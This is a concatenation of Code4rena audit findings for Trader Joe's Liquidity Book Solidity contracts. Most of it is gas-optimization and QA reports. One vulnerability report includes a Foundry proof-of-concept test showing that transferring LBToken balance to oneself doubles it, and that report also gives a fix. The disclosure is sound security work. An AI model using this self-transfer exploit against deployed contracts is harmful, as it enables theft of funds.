src/interfaces/IJoePair.sol  /// @audit MINIMUM_LIQUIDITY(), factory(), token0(), token1(), getReserves(), price0CumulativeLast(), price1CumulativeLast(), kLast(), mint(), burn(), swap(), skim(), sync(), initialize() 7:    interface IJoePair {  ``` https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/interfaces/IJoePair.sol#L7  ```solidity File: src/interfaces/IJoeRouter01.sol  /// @audit factory(), WAVAX(), addLiquidity(), addLiquidityAVAX(), removeLiquidity(), removeLiquidityAVAX(), removeLiquidityWithPermit(), removeLiquidityAVAXWithPermit(), swapExactTokensForTokens(), swapTokensForExactTokens(), swapExactAVAXForTokens(), swapTokensForExactAVAX(), swapExactTokensForAVAX(), swapAVAXForExactTokens(), quote(), getAmountOut(), getAmountIn(), getAmountsOut(), getAmountsIn() 7:    interface IJoeRouter01 {  ``` https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/interfaces/IJoeRouter01.sol#L7  ```solidity File: src/interfaces/IJoeRouter02.sol  /// @audit removeLiquidityAVAXSupportingFeeOnTransferTokens(), removeLiquidityAVAXWithPermitSupportingFeeOnTransferTokens(), swapExactTokensForTokensSupportingFeeOnTransferTokens(), swapExactAVAXForTokensSupportingFeeOnTransferTokens(), swapExactTokensForAVAXSupportingFeeOnTransferTokens() 9:    interface IJoeRouter02 is IJoeRouter01 {  ``` https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/interfaces/IJoeRouter02.sol#L9  ```solidity File: src/interfaces/ILBFactory.sol  /// @audit MAX_FEE(), MIN_BIN_STEP(), MAX_BIN_STEP(), MAX_PROTOCOL_SHARE(), LBPairImplementation(), getNumberOfQuoteAssets(), getQuoteAsset(), isQuoteAsset(), feeRecipient(), flashLoanFee(), creationUnlocked(), allLBPairs(), getNumberOfLBPairs(), getLBPairInformation(), getPreset(), getAllBinSteps(), getAllLBPairs(), setLBPairImplementation(), createLBPair(), setLBPairIgnored(), setPreset(), removePreset(), setFeesParametersOnPair(), setFeeRecipient(), setFlashLoanFee(), setFactoryLockedState(), addQuoteAsset(), removeQuoteAsset(), forceDecay() 13:   interface ILBFactory is IPendingOwnable {  ``` https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/interfaces/ILBFactory.sol#L13  ```solidity File: src/interfaces/ILBFlashLoanCallback.sol  /// @audit LBFlashLoanCallback() 8:    interface ILBFlashLoanCallback {  ``` https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/interfaces/ILBFlashLoanCallback.sol#L8  ```solidity File: src/interfaces/ILBPair.sol  /// @audit tokenX(), tokenY(), factory(), getReservesAndId(), getGlobalFees(), getOracleParameters(), getOracleSampleFrom(), feeParameters(), findFirstNonEmptyBinId(), getBin(), pendingFees(), swap(), flashLoan(), mint(), burn(), increaseOracleLength(), collectFees(), collectProtocolFees(), setFeesParameters(), forceDecay(), initialize() 13:   interface ILBPair {  ``` https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/interfaces/ILBPair.sol#L13  ```solidity File: src/interfaces/ILBRouter.sol  /// @audit factory(), oldFactory(), wavax(), getIdFromPrice(), getPriceFromId(), getSwapIn(), getSwapOut(), createLBPair(), addLiquidity(), addLiquidityAVAX(), removeLiquidity(), removeLiquidityAVAX(), swapExactTokensForTokens(), swapExactTokensForAVAX(), swapExactAVAXForTokens(), swapTokensForExactTokens(), swapTokensForExactAVAX(), swapAVAXForExactTokens(), swapExactTokensForTokensSupportingFeeOnTransferTokens(), swapExactTokensForAVAXSupportingFeeOnTransferTokens(), swapExactAVAXForTokensSupportingFeeOnTransferTokens(), sweep(), sweepLBToken() 13:   interface ILBRouter {  ``` https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/interfaces/ILBRouter.sol#L13  ```solidity File: src/interfaces/ILBToken.sol  /// @audit userPositionAtIndex(), userPositionNumber(), totalSupply(), safeTransferFrom(), safeBatchTransferFrom() 8:    interface ILBToken {  ``` https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/interfaces/ILBToken.sol#L8  ```solidity File: src/interfaces/IPendingOwnable.sol  /// @audit pendingOwner(), setPendingOwner(), revokePendingOwner(), becomeOwner() 8:    interface IPendingOwnable {  ``` https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/interfaces/IPendingOwnable.sol#L8  ```solidity File: src/LBQuoter.sol  /// @audit findBestPathFromAmountIn(), findBestPathFromAmountOut() 17:   contract LBQuoter {  ``` https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBQuoter.sol#L17  ### [G&#x2011;09]  Use a more recent version of solidity Use a solidity version of at least 0.8.2 to get simple compiler automatic inlining Use a solidity version of at least 0.8.3 to get better struct packing and cheaper multiple storage reads Use a solidity version of at least 0.8.4 to get custom errors, which are cheaper at deployment than `revert()/require()` strings Use a solidity version of at least 0.8.10 to have external calls skip contract existence checks if the external call has a return value  *There are 37 instances of this issue:* ```solidity File: src/interfaces/IJoeFactory.sol  3:    pragma solidity ^0.8.0;  ``` https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/interfaces/IJoeFactory.sol#L3  ```solidity File: src/interfaces/IJoePair.sol  3:    pragma solidity ^0.8.0;  ``` https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/interfaces/IJoePair.sol#L3  ```solidity File: src/interfaces/IJoeRouter01.sol  3:    pragma solidity ^0.8.0;  ``` https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/interfaces/IJoeRouter01.sol#L3  ```solidity File: src/interfaces/IJoeRouter02.sol  3:    pragma solidity ^0.8.0;  ``` https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/interfaces/IJoeRouter02.sol#L3  ```solidity File: src/interfaces/ILBFactory.sol  3:    pragma solidity ^0.8.0;  ``` https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/interfaces/ILBFactory.sol#L3  ```solidity File: src/interfaces/ILBFlashLoanCallback.sol  3:    pragma solidity ^0.8.0;  ``` https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/interfaces/ILBFlashLoanCallback.sol#L3  ```solidity File: src/interfaces/ILBPair.sol  3:    pragma solidity ^0.8.0;  ``` https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/interfaces/ILBPair.sol#L3  ```solidity File: src/interfaces/ILBRouter.sol  3:    pragma solidity ^0.8.0;  ``` https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/interfaces/ILBRouter.sol#L3  ```solidity File: src/interfaces/ILBToken.sol  3:    pragma solidity ^0.8.0;  ``` https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/interfaces/ILBToken.sol#L3  ```solidity File: src/interfaces/IPendingOwnable.sol  3:    pragma solidity ^0.8.0;  ``` https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/interfaces/IPendingOwnable.sol#L3  ```solidity File: src/interfaces/IWAVAX.sol  3:    pragma solidity ^0.8.0;  ``` https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/interfaces/IWAVAX.sol#L3  ```solidity File: src/LBErrors.sol  3:    pragma solidity ^0.8.0;  ``` https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBErrors.sol#L3  ```solidity File: src/LBFactory.sol  3:    pragma solidity ^0.8.0;  ``` https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBFactory.sol#L3  ```solidity File: src/LBPair.sol  3:    pragma solidity ^0.8.0;  ``` https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBPair.sol#L3  ```solidity File: src/LBQuoter.sol  3:    pragma solidity ^0.8.0;  ``` https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBQuoter.sol#L3  ```solidity File: src/LBRouter.sol  3:    pragma solidity ^0.8.0;  ``` https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBRouter.sol#L3  ```solidity File: src/LBToken.sol  3:    pragma solidity ^0.8.0;  ``` https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBToken.sol#L3  ```solidity File: src/libraries/BinHelper.sol  3:    pragma solidity ^0.8.0;  ``` https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/libraries/BinHelper.sol#L3  ```solidity File: src/libraries/BitMath.sol  3:    pragma solidity ^0.8.0;  ``` https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/libraries/BitMath.sol#L3  ```solidity File: src/libraries/Buffer.sol  3:    pragma solidity ^0.8.0;  ``` https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/libraries/Buffer.sol#L3  ```solidity File: src/libraries/Constants.sol  3:    pragma solidity ^0.8.0;  ``` https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/libraries/Constants.sol#L3  ```solidity File: src/libraries/Decoder.sol  3:    pragma solidity ^0.8.0;  ``` https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/libraries/Decoder.sol#L3  ```solidity File: src/libraries/Encoder.sol  3:    pragma solidity ^0.8.0;  ``` https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/libraries/Encoder.sol#L3  ```solidity File: src/libraries/FeeDistributionHelper.sol  3:    pragma solidity ^0.8.0;  ``` https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/libraries/FeeDistributionHelper.sol#L3  ```solidity File: src/libraries/FeeHelper.sol  3:    pragma solidity ^0.8.0;  ``` https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/libraries/FeeHelper.sol#L3  ```solidity File: src/libraries/JoeLibrary.sol  3:    pragma solidity ^0.8.0;  ``` https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/libraries/JoeLibrary.sol#L3  ```solidity File: src/libraries/Math128x128.sol  3:    pragma solidity ^0.8.0;  ``` https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/libraries/Math128x128.sol#L3  ```solidity File: src/libraries/Math512Bits.sol  3:    pragma solidity ^0.8.0;  ``` https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/libraries/Math512Bits.sol#L3  ```solidity File: src/libraries/Oracle.sol  3:    pragma solidity ^0.8.0;  ``` https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/libraries/Oracle.sol#L3  ```solidity File: src/libraries/PendingOwnable.sol  3:    pragma solidity ^0.8.0;  ``` https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/libraries/PendingOwnable.sol#L3  ```solidity File: src/libraries/ReentrancyGuardUpgradeable.sol  3:    pragma solidity ^0.8.0;  ``` https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/libraries/ReentrancyGuardUpgradeable.sol#L3  ```solidity File: src/libraries/SafeCast.sol  3:    pragma solidity ^0.8.0;  ``` https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/libraries/SafeCast.sol#L3  ```solidity File: src/libraries/SafeMath.sol  3:    pragma solidity ^0.8.0;  ``` https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/libraries/SafeMath.sol#L3  ```solidity File: src/libraries/Samples.sol  3:    pragma solidity ^0.8.0;  ``` https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/libraries/Samples.sol#L3  ```solidity File: src/libraries/SwapHelper.sol  3:    pragma solidity ^0.8.0;  ``` https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/libraries/SwapHelper.sol#L3  ```solidity File: src/libraries/TokenHelper.sol  3:    pragma solidity ^0.8.0;  ``` https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/libraries/TokenHelper.sol#L3  ```solidity File: src/libraries/TreeMath.sol  3:    pragma solidity ^0.8.0;  ``` https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/libraries/TreeMath.sol#L3  ### [G&#x2011;10]  `>=` costs less gas than `>` The compiler uses opcodes `GT` and `ISZERO` for solidity code that uses `>`, but only requires `LT` for `>=`, [which saves **3 gas**](https://gist.github.com/IllIllI000/3dc79d25acccfa16dee4e83ffdc6ffde)  *There is 1 instance of this issue:* ```solidity File: src/LBRouter.sol  116:                  _amountOutOfBin = _amountOut > _reserve ? _reserve : _amountOut;  ``` https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBRouter.sol#L116  ### [G&#x2011;11]  Functions guaranteed to revert when called by normal users can be marked `payable` If a function modifier such as `onlyOwner` is used, the function will revert if a normal user tries to pay the function. Marking the function as `payable` will lower the gas cost for legitimate callers because the compiler will not include checks for whether a payment was provided. The extra opcodes avoided are  `CALLVALUE`(2),`DUP1`(3),`ISZERO`(3),`PUSH2`(3),`JUMPI`(10),`PUSH1`(3),`DUP1`(3),`REVERT`(0),`JUMPDEST`(1),`POP`(2), which costs an average of about **21 gas per call** to the function, in addition to the extra deployment cost  *There are 20 instances of this issue:* ```solidity File: src/LBFactory.sol  215:      function setLBPairImplementation(address _LBPairImplementation) external override onlyOwner {  312       function setLBPairIgnored( 313           IERC20 _tokenX, 314           IERC20 _tokenY, 315           uint256 _binStep, 316           bool _ignored 317:      ) external override onlyOwner {  340       function setPreset( 341           uint16 _binStep, 342           uint16 _baseFactor, 343           uint16 _filterPeriod, 344           uint16 _decayPeriod, 345           uint16 _reductionFactor, 346           uint24 _variableFeeControl, 347           uint16 _protocolShare, 348           uint24 _maxVolatilityAccumulated, 349           uint16 _sampleLifetime 350:      ) external override onlyOwner {  396:      function removePreset(uint16 _binStep) external override onlyOwner {  423       function setFeesParametersOnPair( 424           IERC20 _tokenX, 425           IERC20 _tokenY, 426           uint16 _binStep, 427           uint16 _baseFactor, 428           uint16 _filterPeriod, 429           uint16 _decayPeriod, 430           uint16 _reductionFactor, 431           uint24 _variableFeeControl, 432           uint16 _protocolShare, 433           uint24 _maxVolatilityAccumulated 434:      ) external override onlyOwner {  468:      function setFeeRecipient(address _feeRecipient) external override onlyOwner {  474:      function setFlashLoanFee(uint256 _flashLoanFee) external override onlyOwner {  485:      function setFactoryLockedState(bool _locked) external override onlyOwner {  493:      function addQuoteAsset(IERC20 _quoteAsset) external override onlyOwner {  502:      function removeQuoteAsset(IERC20 _quoteAsset) external override onlyOwner {  520:      function forceDecay(ILBPair _LBPair) external override onlyOwner {  ``` https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBFactory.sol#L215  ```solidity File: src/LBPair.sol  104       function initialize( 105           IERC20 _tokenX, 106           IERC20 _tokenY, 107           uint24 _activeId, 108           uint16 _sampleLifetime, 109           bytes32 _packedFeeParameters 110:      ) external override onlyFactory {  788:      function setFeesParameters(bytes32 _packedFeeParameters) external override onlyFactory {  792:      function forceDecay() external override onlyFactory {  ``` https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBPair.sol#L104-L110  ```solidity File: src/LBRouter.sol  622       function sweep( 623           IERC20 _token, 624           address _to, 625           uint256 _amount 626:      ) external override onlyFactoryOwner {  642       function sweepLBToken( 643           ILBToken _lbToken, 644           address _to, 645           uint256[] memory _ids, 646           uint256[] memory _amounts 647:      ) external override onlyFactoryOwner {  ``` https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBRouter.sol#L622-L626  ```solidity File: src/libraries/PendingOwnable.sol  59:       function setPendingOwner(address pendingOwner_) public override onlyOwner {  68:       function revokePendingOwner() public override onlyOwner {  75:       function becomeOwner() public override onlyPendingOwner {  84:       function renounceOwnership() public override onlyOwner {  ``` https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/libraries/PendingOwnable.sol#L59   ___   ## Excluded findings These findings are excluded from awards calculations because there are publicly-available automated tools that find them. The valid ones appear here for completeness  ### [G&#x2011;01]  `<array>.length` should not be looked up in every loop of a `for`-loop The overheads outlined below are _PER LOOP_, excluding the first loop * storage arrays incur a Gwarmaccess (**100 gas**) * memory arrays use `MLOAD` (**3 gas**) * calldata arrays use `CALLDATALOAD` (**3 gas**)  Caching the length changes each of these to a `DUP<N>` (**3 gas**), and gets rid of the extra `DUP<N>` needed to store the stack offset  *There are 13 instances of this issue:* ```solidity File: src/LBPair.sol  /// @audit (valid but excluded finding) 274:              for (uint256 i; i < _ids.length; ++i) {  /// @audit (valid but excluded finding) 496:              for (uint256 i; i < _ids.length; ++i) {  /// @audit (valid but excluded finding) 623:              for (uint256 i; i < _ids.length; ++i) {  /// @audit (valid but excluded finding) 701:              for (uint256 i; i < _ids.length; ++i) {  ``` https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBPair.sol#L274  ```solidity File: src/LBQuoter.sol  /// @audit (valid but excluded finding) 100:                  for (uint256 j; j < LBPairsAvailable.length; j++) {  /// @audit (valid but excluded finding) 177:                  for (uint256 j; j < LBPairsAvailable.length; j++) {  ``` https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBQuoter.sol#L100  ```solidity File: src/LBRouter.sol  /// @audit (valid but excluded finding) 674:              for (uint256 i; i < depositIds.length; ++i) {  /// @audit (valid but excluded finding) 778:              for (uint256 i; i < _pairs.length; ++i) {  /// @audit (valid but excluded finding) 831:              for (uint256 i; i < _pairs.length; ++i) {  /// @audit (valid but excluded finding) 878:              for (uint256 i; i  ... See the rest this report [here](https://github.com/code-423n4/2022-10-traderjoe-findings/blob/main/data/IllIllI-G.md)
# Lines of code  https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBToken.sol#L182 https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBToken.sol#L187 https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBToken.sol#L189-L192   # Vulnerability details  ## Impact Using temporary variables to update balances is a dangerous construction that has led to several hacks in the past. Here, we can see that `_toBalance` can overwrite `_fromBalance`:  ```solidity File: LBToken.sol 176:     function _transfer( 177:         address _from, 178:         address _to, 179:         uint256 _id, 180:         uint256 _amount 181:     ) internal virtual { 182:         uint256 _fromBalance = _balances[_id][_from]; ... 187:         uint256 _toBalance = _balances[_id][_to]; 188:  189:         unchecked { 190:             _balances[_id][_from] = _fromBalance - _amount; 191:             _balances[_id][_to] = _toBalance + _amount; //@audit : if _from == _to : rekt 192:         } .. 196:     } ```  Furthermore, the `safeTransferFrom` function has the `checkApproval` modifier which passes without any limit if `_owner == _spender` :  ```solidity File: LBToken.sol 32:     modifier checkApproval(address _from, address _spender) { 33:         if (!_isApprovedForAll(_from, _spender)) revert LBToken__SpenderNotApproved(_from, _spender); 34:         _; 35:     } ... 131:     function safeTransferFrom( ... 136:     ) public virtual override checkAddresses(_from, _to) checkApproval(_from, msg.sender) { ... 269:     function _isApprovedForAll(address _owner, address _spender) internal view virtual returns (bool) { 270:         return _owner == _spender || _spenderApprovals[_owner][_spender]; 271:     } ```  ## Proof of Concept Add the following test to `LBToken.t.sol` (run it with `forge test --match-path test/LBToken.t.sol --match-test testSafeTransferFromOneself -vvvv`):  ```solidity     function testSafeTransferFromOneself() public {         uint256 amountIn = 1e18;          (uint256[] memory _ids, , , ) = addLiquidity(amountIn, ID_ONE, 5, 0);          uint256 initialBalance = pair.balanceOf(DEV, _ids[0]);          assertEq(initialBalance, 333333333333333333); // using hardcoded value to ease understanding          pair.safeTransferFrom(DEV, DEV, _ids[0], initialBalance); //transfering to oneself         uint256 rektBalance1 = pair.balanceOf(DEV, _ids[0]); //computing new balance         assertEq(rektBalance1, 2 * initialBalance); // the new balance is twice the initial one         assertEq(rektBalance1, 666666666666666666); // using hardcoded value to ease understanding     } ```  As we can see here, this test checks that transfering all your funds to yourself doubles your balance, and it's passing. This can be repeated again and again to increase your balance.  ## Recommended Mitigation Steps - Add checks to make sure that `_from != _to` because that shouldn't be useful anyway - Prefer the following:  ```solidity File: LBToken.sol 189:         unchecked { 190:             _balances[_id][_from] -= _amount; 191:             _balances[_id][_to] += _amount; 192:         } ```
## Unify bit access to variables  Packed variables are sometimes accessed using `Decoder.decode` and sometimes accessed by directly applying a mask and a shift.  ## `binStep` size should probably be 16 in `LBPairInformation` struct  The `createLBPair` function present in the factory takes the `binStep` argument as a `uint16`, which aligns also with packed size in the fee parameters and other uses.  However, the size for the `binStep` in the `LBPairInformation` is `uint24`.  ## `burn` function in `LBPair` should validate array lengths  The `burn` function receives two arrays that are iterated simultaneously and should have the same length. Consider adding a validation to ensure their lengths match.
# Gas Optimizations Report  ## [G-01] Owner token enumeration is an extremely expensive operation but it is not essential to the protocol  `LBToken` [enumerates token/bin IDs owned by users in a pair](https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBToken.sol#L26-L27). The enumeration is only exposed through [two external functions](https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBToken.sol#L96-L109), which are just for convenience for off-chain usage, and not necessary for the functionality of the protocol. Removing enumeration will save tremendous amounts of gas during essential operations of adding and removing liquidity.  ### Impact of enumeration  OpenZeppelins EnumerableSet roughly costs 50,000 gas when adding and removing elements from the set. Even for a small price range, adding liquidity in Liquidity Book requires minting tokens from many bins. For example, currently [the testnet user interface](https://gadgetzan.traderjoexyz.com/poolv2/0xb6076c93701d6a07266c31066b298aec6dd65c2d/0xab231a5744c8e6c45481754928ccffffd4aa0732/1) mints 31 tokens when adding liquidity in a normal distribution shape. This operation [roughly costs 4,000,000 gas](https://testnet.snowtrace.io/tx/0x88812398557021281e52eacf38f5064a344d4bee0290e96b37ffc2bea6102042), and removal costs about half of that. Given a volatile market, we can expect users to remove and re-add liquidity pretty often. This coupled operation costs around 6,000,000 gas if you have the minimum amount of bins in a normal distribution (31 as allowed by the current UI), which will be about 0.15 AVAX (25 nAVAX base fee). That would be \$2.25 in current AVAX price (\$15). And that would be \$15 when AVAX is \$100, and \$120 when AVAX is $100 and network is heavily used (200 nAVAX base fee). Given that the protocol needs `swap_fee_earned / gas_fee_to_move_liquidity` to be greater than `1` to incentivize users to chase the price to concentrate the liquidity, the mint & burn fees must be as little as possible to allow non-whales to be also able to profitably move around their liquidity. Removing the enumeration can nearly halve that cost, making the protocol enticing to more users.  ### [Non-]reasons to enumerate  Enumeration allows user interfaces to easily see which bins a user is in directly from the blockchain. With the absence of enumeration, Trader Joe will need to index this information either using in-house tools or using something like The Graph. Trader Joe team is already familiar with indexing through their NFT marketplace Joepegs, therefore it seems practical for them to go off-chain indexing route.  Enumeration allows a decentralized way to pull the information from the blockchain. We have to admit that not enumerating would be in detriment to user interfaces that would have wanted to integrate Liquidity Book by using decentralized methods only. However, that is a very small percent of builders that hold such principles. The rest of the builders can also use off-chain indexing.  There is also the end user who might want to learn which bins they are in conveniently using decentralized methods. They can still do this in decentralized manner by checking all the bins, given the bin IDs are determined by step and price and have a range of few thousand (bin step = 100) to few millions (bin step = 1). Admittedly this is not very convenient, but it is doable.  ### Diff to remove enumeration  The following diff removes the enumeration from the code and tests.  ```diff diff --git a/src/LBToken.sol b/src/LBToken.sol index 47aa528..6cb1dbc 100644 --- a/src/LBToken.sol +++ b/src/LBToken.sol @@ -23,9 +23,6 @@ contract LBToken is ILBToken {      /// @dev Mapping from token id to total supplies      mapping(uint256 => uint256) private _totalSupplies;  -    /// @dev  Mapping from account to set of ids, where user currently have a non-zero balance -    mapping(address => EnumerableSet.UintSet) private _userIds; -      string private constant _name = "Liquidity Book Token";      string private constant _symbol = "LBT";  @@ -93,21 +90,6 @@ contract LBToken is ILBToken {          }      }  -    /// @notice Returns the type id at index `_index` where `account` has a non-zero balance -    /// @param _account The address of the account -    /// @param _index The position index -    /// @return The `account` non-zero position at index `_index` -    function userPositionAtIndex(address _account, uint256 _index) public view virtual override returns (uint256) { -        return _userIds[_account].at(_index); -    } - -    /// @notice Returns the number of non-zero balances of `account` -    /// @param _account The address of the account -    /// @return The number of non-zero balances of `account` -    function userPositionNumber(address _account) public view virtual override returns (uint256) { -        return _userIds[_account].length(); -    } -      /// @notice Returns true if `spender` is approved to transfer `_account`'s tokens      /// @param _owner The address of the owner      /// @param _spender The address of the spender @@ -190,9 +172,6 @@ contract LBToken is ILBToken {              _balances[_id][_from] = _fromBalance - _amount;              _balances[_id][_to] = _toBalance + _amount;          } - -        _remove(_from, _id, _fromBalance, _amount); -        _add(_to, _id, _toBalance, _amount);      }       /// @dev Creates `_amount` tokens of type `_id`, and assigns them to `_account` @@ -215,8 +194,6 @@ contract LBToken is ILBToken {              _balances[_id][_account] = _accountBalance + _amount;          }  -        _add(_account, _id, _accountBalance, _amount); -          emit TransferSingle(msg.sender, address(0), _account, _id, _amount);      }  @@ -241,8 +218,6 @@ contract LBToken is ILBToken {              _totalSupplies[_id] -= _amount;          }  -        _remove(_account, _id, _accountBalance, _amount); -          emit TransferSingle(msg.sender, _account, address(0), _id, _amount);      }  @@ -270,38 +245,6 @@ contract LBToken is ILBToken {          return _owner == _spender || _spenderApprovals[_owner][_spender];      }  -    /// @notice Internal function to add an id to an user's set -    /// @param _account The user's address -    /// @param _id The id of the token -    /// @param _accountBalance The user's balance -    /// @param _amount The amount of tokens -    function _add( -        address _account, -        uint256 _id, -        uint256 _accountBalance, -        uint256 _amount -    ) internal { -        if (_accountBalance == 0 && _amount != 0) { -            _userIds[_account].add(_id); -        } -    } - -    /// @notice Internal function to remove an id from an user's set -    /// @param _account The user's address -    /// @param _id The id of the token -    /// @param _accountBalance The user's balance -    /// @param _amount The amount of tokens -    function _remove( -        address _account, -        uint256 _id, -        uint256 _accountBalance, -        uint256 _amount -    ) internal { -        if (_accountBalance == _amount && _amount != 0) { -            _userIds[_account].remove(_id); -        } -    } -      /// @notice Hook that is called before any token transfer. This includes minting      /// and burning.      /// diff --git a/src/interfaces/ILBToken.sol b/src/interfaces/ILBToken.sol index 36b1fb7..49c6243 100644 --- a/src/interfaces/ILBToken.sol +++ b/src/interfaces/ILBToken.sol @@ -29,10 +29,6 @@ interface ILBToken {          view          returns (uint256[] memory batchBalances);  -    function userPositionAtIndex(address account, uint256 index) external view returns (uint256); - -    function userPositionNumber(address account) external view returns (uint256); -      function totalSupply(uint256 id) external view returns (uint256);       function isApprovedForAll(address owner, address spender) external view returns (bool); diff --git a/test/LBRouter.t.sol b/test/LBRouter.t.sol index 4f2aa33..a38d9fb 100644 --- a/test/LBRouter.t.sol +++ b/test/LBRouter.t.sol @@ -410,10 +410,8 @@ contract LiquidityBinRouterTest is TestHelper {           uint256[] memory amounts = new uint256[](5);          for (uint256 i; i < 5; i++) { -            assertEq(pair.userPositionAtIndex(DEV, i), _ids[i]);              amounts[i] = pair.balanceOf(DEV, _ids[i]);          } -        assertEq(pair.userPositionNumber(DEV), 5);           assertEq(pair.balanceOf(DEV, ID_ONE - 1), amountIn / 3);  diff --git a/test/LBToken.t.sol b/test/LBToken.t.sol index d263153..b5aa7cc 100644 --- a/test/LBToken.t.sol +++ b/test/LBToken.t.sol @@ -34,10 +34,8 @@ contract LiquidityBinTokenTest is TestHelper {           uint256[] memory amounts = new uint256[](5);          for (uint256 i; i < 5; i++) { -            assertEq(pair.userPositionAtIndex(DEV, i), _ids[i]);              amounts[i] = pair.balanceOf(DEV, _ids[i]);          } -        assertEq(pair.userPositionNumber(DEV), 5);           assertEq(pair.balanceOf(DEV, ID_ONE - 1), amountIn / 3);          vm.expectEmit(true, true, true, true); @@ 